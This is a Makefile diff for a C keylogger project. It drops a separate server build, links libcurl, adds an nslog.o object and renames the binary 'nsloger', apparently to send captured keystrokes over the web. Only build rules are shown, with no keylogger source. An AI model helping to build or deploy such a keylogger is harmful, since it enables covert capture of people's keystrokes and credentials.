@@ -1,19 +1,15 @@
 CC=gcc
+LIBS=-lcurl
 CFLAGS=-c -Wall
-KEYLOG_TARGETS=main.o keylogger.o networking.o find_event_file.o
-SERVER_TARGETS=server.o networking.o
+KEYLOG_TARGETS=main.o keylogger.o networking.o find_event_file.o nslog.o
 
-all: keylog server
+all: nsloger
 
-keylog: $(KEYLOG_TARGETS)
-	$(CC) $^ -o $@
-
-server: $(SERVER_TARGETS)
-	$(CC) $^ -o $@
-
+nsloger: $(KEYLOG_TARGETS)
+	$(CC) -o $@ $^ $(LIBS)
 
 .PHONY: clean
 clean:
 	@echo "Cleaning..."
-	-rm -f keylog server *.o
+	-rm -f nsloger *.o
 	@echo "Finished cleaning."
